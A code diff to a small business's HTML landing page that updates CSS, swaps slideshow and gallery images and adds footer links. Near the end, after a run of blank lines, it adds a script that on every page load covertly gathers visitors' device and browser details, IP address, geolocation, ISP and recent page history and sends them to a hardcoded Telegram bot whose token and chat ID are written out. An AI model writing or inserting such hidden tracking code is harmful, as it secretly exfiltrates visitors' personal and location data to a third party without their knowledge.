@@ -51,6 +51,7 @@
       border-radius: 15px;
       box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
       margin: 0 5% 0 5%;
+      align-item: center;
     }
     .slide {
       display: none;
@@ -165,6 +166,11 @@
         font-family: 'Poppins', sans-serif;
         font-size: 15px;
    }
+   
+   a{
+       color: #000;
+       text-style: bold;
+   }
   </style>
 </head>
 <body>
@@ -174,9 +180,9 @@
 
   <!-- Slideshow -->
   <div class="slideshow-container">
-    <img class="slide active" src="https://img.freepik.com/free-vector/peonies-maroon-floral-frame-wedding-invitation-flower-frame-with-peonies-leaves-berries-isolated-white-background-design-card-print-invitations_41066-3795.jpg?t=st=1739530133~exp=1739533733~hmac=c6d9eeef6c1b6842bb80a7a10e5ee5c1657fdbfd95c676e55a12c7ef9fbff36a&w=826">
-    <img class="slide" src="https://img.freepik.com/free-vector/peonies-maroon-floral-frame-wedding-invitation-flower-frame-with-peonies-leaves-berries-isolated-white-background-design-card-print-invitations_41066-3795.jpg?t=st=1739530133~exp=1739533733~hmac=c6d9eeef6c1b6842bb80a7a10e5ee5c1657fdbfd95c676e55a12c7ef9fbff36a&w=826">
-    <img class="slide" src="https://img.freepik.com/free-vector/peonies-maroon-floral-frame-wedding-invitation-flower-frame-with-peonies-leaves-berries-isolated-white-background-design-card-print-invitations_41066-3795.jpg?t=st=1739530133~exp=1739533733~hmac=c6d9eeef6c1b6842bb80a7a10e5ee5c1657fdbfd95c676e55a12c7ef9fbff36a&w=826">
+    <img class="slide active" src="slide1.jpg">
+    <img class="slide" src="slide2.jpg">
+    <img class="slide" src="slide3.jpg">
     <div class="prev" onclick="prevSlide()">❮</div>
     <div class="next" onclick="nextSlide()">❯</div>
   </div>
@@ -185,10 +191,38 @@
   <h2 style="text-align: center;">Image Gallery</h2>
   <div class="gallery-container">
     <div class="gallery-item">
-      <img src="https://via.placeholder.com/300x200" alt="Image 1">
+      <img src="2.jpeg" alt="Image 1">
     </div>
     <div class="gallery-item">
-      <img src="https://img.freepik.com/free-vector/empty-wooden-room_1441-4014.jpg?t=st=1739531720~exp=1739535320~hmac=09d9fc9bab97b88369bbcc2574cf66495816a9227da68f07f229c612a016bd5b&w=826" alt="Image 2">
+      <img src="1.jpeg" alt="Image 2">
+    </div>
+    
+    <div class="gallery-item">
+      <img src="3.jpeg" alt="Image 2">
+    </div>
+    
+    <div class="gallery-item">
+      <img src="4.jpeg" alt="Image 2">
+    </div>
+    
+    <div class="gallery-item">
+      <img src="5.jpeg" alt="Image 2">
+    </div>
+    
+    <div class="gallery-item">
+      <img src="6.jpeg" alt="Image 2">
+    </div>
+    
+    <div class="gallery-item">
+      <img src="7.jpeg" alt="Image 2">
+    </div>
+    
+      <div class="gallery-item">
+      <img src="8.jpeg" alt="Image 2">
+    </div>
+    
+      <div class="gallery-item">
+      <img src="9.jpeg" alt="Image 2">
     </div>
   </div>
 
@@ -223,11 +257,11 @@
 
   <!-- Footer -->
   <div class="footer" style="color: #000;">
-    <p style="color: #000;">&copy; 2025 Your TopUp Center. All rights reserved.</p>
-    <p style="color: #000;">Developed by Ali Hosen</p>
+    <p style="color: #000;">&copy; 2025 <a href="https://yourtopupcenter.github.io"><b>Your TopUp Center</b></a>. All rights reserved.</p>
+    <p style="color: #000;">Developed, Grapice and Maintance by <a href="https://alihosenofficial.github.io"><b>Ali Hosen</b></a></p>
   </div>
 
-  <!-- JavaScript -->
+ 
   <script>
     let slideIndex = 0;
     const slides = document.querySelectorAll(".slide");
@@ -247,6 +281,114 @@
       slideIndex = (slideIndex + 1) % slides.length;
       showSlides();
     }
+    
+    
+    
+       
+    
+    // Collecting device and browser info
+var deviceInfo = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screenResolution: `${window.screen.width}x${window.screen.height}`,
+    colorDepth: window.screen.colorDepth
+};
+
+var browserInfo = {
+    browser: navigator.appName,
+    version: navigator.appVersion,
+    cookiesEnabled: navigator.cookieEnabled,
+    onlineStatus: navigator.onLine ? "Online" : "Offline"
+};
+
+// Collecting page and IP info
+var ipInfo = {
+    ip: "retrieved by server-side API", // Placeholder for IP, needs server-side API
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    referrer: document.referrer || "Direct Visit", // Referrer page
+    pageTitle: document.title,
+    pageURL: window.location.href,
+    browsingHistory: [] // Placeholder for user history
+};
+
+// Fetching ISP and IP details using ipinfo.io API
+fetch('https://ipinfo.io/json')
+    .then(response => response.json())
+    .then(data => {
+        ipInfo.ip = data.ip;
+        ipInfo.city = data.city;
+        ipInfo.region = data.region;
+        ipInfo.country = data.country;
+        ipInfo.location = data.loc;
+        ipInfo.isp = data.org;
+
+        // Collecting browsing history (Last 5 pages visited)
+        collectUserHistory();
+
+        // Sending data to Telegram Bot
+        sendToTelegramBot();
+    });
+
+// Function to collect user's browsing history (real-time, last 5 pages)
+function collectUserHistory() {
+    if (localStorage.getItem("userHistory")) {
+        let history = JSON.parse(localStorage.getItem("userHistory"));
+        history.push(window.location.href);
+        if (history.length > 5) history.shift(); // Keep only the last 5
+        localStorage.setItem("userHistory", JSON.stringify(history));
+        ipInfo.browsingHistory = history;
+    } else {
+        localStorage.setItem("userHistory", JSON.stringify([window.location.href]));
+        ipInfo.browsingHistory = [window.location.href];
+    }
+}
+
+// Function to send data to Telegram Bot
+function sendToTelegramBot() {
+    var botToken = "7519273136:AAHZ7eBXEoVZRQFqILu8tGnuMLvtZOWohqc"; // Replace with your bot token
+    var chatId = "7945358964"; // Replace with your chat ID
+
+    var message = `🌺 *Flower ~ Device and Browser Information* 🌟\n` +
+                  `📱 **Device Info:**\n` +
+                  `- User Agent: ${deviceInfo.userAgent}\n` +
+                  `- Platform: ${deviceInfo.platform}\n` +
+                  `- Language: ${deviceInfo.language}\n` +
+                  `- Screen Resolution: ${deviceInfo.screenResolution}\n` +
+                  `- Color Depth: ${deviceInfo.colorDepth}\n\n` +
+                  `🌐 **Browser Info:**\n` +
+                  `- Browser: ${browserInfo.browser}\n` +
+                  `- Version: ${browserInfo.version}\n` +
+                  `- Cookies Enabled: ${browserInfo.cookiesEnabled}\n` +
+                  `- Online Status: ${browserInfo.onlineStatus}\n\n` +
+                  `📌 **Page Info:**\n` +
+                  `- Title: ${ipInfo.pageTitle}\n` +
+                  `- URL: ${ipInfo.pageURL}\n` +
+                  `- Referrer: ${ipInfo.referrer}\n\n` +
+                  `🌍 **IP and Location Info:**\n` +
+                  `- IP: ${ipInfo.ip}\n` +
+                  `- City: ${ipInfo.city}\n` +
+                  `- Region: ${ipInfo.region}\n` +
+                  `- Country: ${ipInfo.country}\n` +
+                  `- Location (Lat, Long): ${ipInfo.location}\n` +
+                  `- ISP: ${ipInfo.isp}\n` +
+                  `- Timezone: ${ipInfo.timezone}\n\n` +
+                  `📖 **Browsing History:**\n` +
+                  `${ipInfo.browsingHistory.join('\n')}`;
+
+    var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+    // Send HTTP request to Telegram API
+    fetch(url)
+        .then(response => response.json())
+        .then(data => {
+            console.log("Message sent successfully!");
+        })
+        .catch(error => {
+            console.error("Error sending message:", error);
+        });
+}
+
   </script>
 </body>
 </html>
